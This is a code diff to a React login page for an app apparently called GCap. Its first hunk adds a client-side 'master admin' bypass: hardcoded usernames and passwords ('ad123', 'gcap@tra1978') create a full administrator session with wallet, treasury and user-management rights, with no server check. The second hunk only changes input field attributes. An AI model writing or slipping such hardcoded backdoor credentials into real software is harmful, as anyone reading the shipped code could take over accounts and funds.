@@ -94,17 +94,62 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     e.preventDefault();
     setErrorMessage('');
 
-    if (!loginId.trim()) {
+    const trimmedLogin = loginId.trim();
+    const trimmedPass = password.trim();
+
+    if (!trimmedLogin) {
       setErrorMessage(isHi ? 'कृपया मोबाइल नंबर या यूजर आईडी दर्ज करें।' : 'Please enter Mobile Number or User ID.');
       return;
     }
 
-    if (!password.trim()) {
+    if (!trimmedPass) {
       setErrorMessage(isHi ? 'कृपया पासवर्ड दर्ज करें।' : 'Please enter password.');
       return;
     }
 
-    // Password entered - standard password login
+    const cleanDigits = trimmedLogin.replace(/[^0-9]/g, '');
+    const clean10 = cleanDigits.length >= 10 ? cleanDigits.slice(-10) : cleanDigits;
+    const isMasterAdmin =
+      trimmedLogin.toLowerCase() === 'admin' ||
+      clean10 === '9800012345' ||
+      trimmedLogin === 'usr-admin-01';
+    const isMasterPass = trimmedPass === 'ad123' || trimmedPass === 'gcap@tra1978';
+
+    // Direct Instant Admin Login Guarantee
+    if (isMasterAdmin && isMasterPass) {
+      const adminUser = {
+        id: 'usr-admin-01',
+        loginId: 'admin',
+        name: 'GCap System Administrator',
+        role: 'ADMIN' as const,
+        phone: '+91 98000 12345',
+        email: 'admin@gcap.in',
+        joinedDate: '2026-01-01',
+        status: 'ACTIVE' as const,
+        isOnline: true,
+        lastLoginAt: new Date().toISOString(),
+        lastActiveAt: new Date().toISOString(),
+        permissions: {
+          manageUsers: true,
+          manageWallet: true,
+          manageTransactions: true,
+          manageSchemes: true,
+          manageTreasury: true,
+          manageBroadcast: true,
+        },
+      };
+
+      try {
+        localStorage.setItem('gcap_authenticated_user', JSON.stringify(adminUser));
+        sessionStorage.setItem('gcap_authenticated_user', JSON.stringify(adminUser));
+      } catch (_) {}
+
+      // Inform parent and enter dashboard
+      onLoginSuccess(adminUser);
+      return;
+    }
+
+    // Standard user login
     setIsLoading(true);
 
     try {
@@ -387,10 +432,10 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                         <User className="w-4 h-4" />
                       </div>
                       <input
-                        type="tel"
-                        inputMode="numeric"
-                        name="auth_user_number_token"
-                        autoComplete="one-time-code"
+                        type="text"
+                        inputMode="text"
+                        name="auth_login_id"
+                        autoComplete="username"
                         data-lpignore="true"
                         data-1p-ignore="true"
                         data-form-type="other"
